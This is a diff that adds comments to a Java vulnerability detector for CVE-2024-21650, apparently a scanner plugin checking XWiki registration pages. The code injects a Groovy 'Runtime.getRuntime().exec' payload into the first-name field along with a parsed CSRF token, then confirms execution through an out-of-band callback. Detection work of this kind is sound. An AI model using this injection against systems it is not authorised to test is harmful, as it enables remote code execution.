@@ -116,6 +116,7 @@ public final class Cve202421650Detector implements VulnDetector {
     Payload payload = null;
     String cmd = "";
     if (payloadGenerator.isCallbackServerEnabled()) {
+      // Prepare Linux shell RCE for using in payload with callback server.
       PayloadGeneratorConfig config =
           PayloadGeneratorConfig.newBuilder()
               .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
@@ -143,6 +144,8 @@ public final class Cve202421650Detector implements VulnDetector {
 
     String token = "";
 
+    // plain GET request to check user's registration page availability and retrieve csrf form's
+    // token.
     try {
       HttpResponse response =
           httpClient.send(HttpRequest.get(targetUri).withEmptyHeaders().build(), networkService);
@@ -150,6 +153,7 @@ public final class Cve202421650Detector implements VulnDetector {
         return false;
       }
 
+      // Parse the csrf value.
       Matcher csrfTokenMatcher = CSRF_TOKEN_PATTERN.matcher(response.bodyString().orElse(""));
       if (csrfTokenMatcher.find()) {
         token = csrfTokenMatcher.group(1);
@@ -162,6 +166,8 @@ public final class Cve202421650Detector implements VulnDetector {
       logger.atWarning().withCause(e).log("Unable to request '%s'.", targetUri);
     }
 
+    // Inject Groovy payload in the first name, pass csrf token, random strings for required fields
+    // to form's POST data.
     String requestBody =
         REQUEST_POST_DATA
             .replace("{{USERNAME}}", requestUserName)
@@ -171,6 +177,7 @@ public final class Cve202421650Detector implements VulnDetector {
             .replace("{{CMD}}", !cmd.isEmpty() ? "Runtime.getRuntime().exec(\"" + cmd + "\")" : "");
 
     try {
+      // Main request that performs vulnerability check.
       HttpResponse response =
           httpClient.send(
               HttpRequest.post(targetUri)
@@ -184,6 +191,8 @@ public final class Cve202421650Detector implements VulnDetector {
 
       Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
 
+      // Update the user's profile by changing the first name to notify the XWiki administrator for
+      // account removal, as default settings prevent users from deleting their own profiles.
       httpClient.send(
           HttpRequest.put(targetCleanupUri)
               .setHeaders(
@@ -205,6 +214,8 @@ public final class Cve202421650Detector implements VulnDetector {
               .build(),
           networkService);
 
+      // Try to use callback server for RCE confirmation and raise severity on success.
+      // Otherwise, detect vulnerability through response body matching.
       if (payload != null && payload.checkIfExecuted()) {
         vulnSeverity = Severity.CRITICAL;
         logger.atInfo().log("The remote code execution was confirmed via an out-of-band callback.");
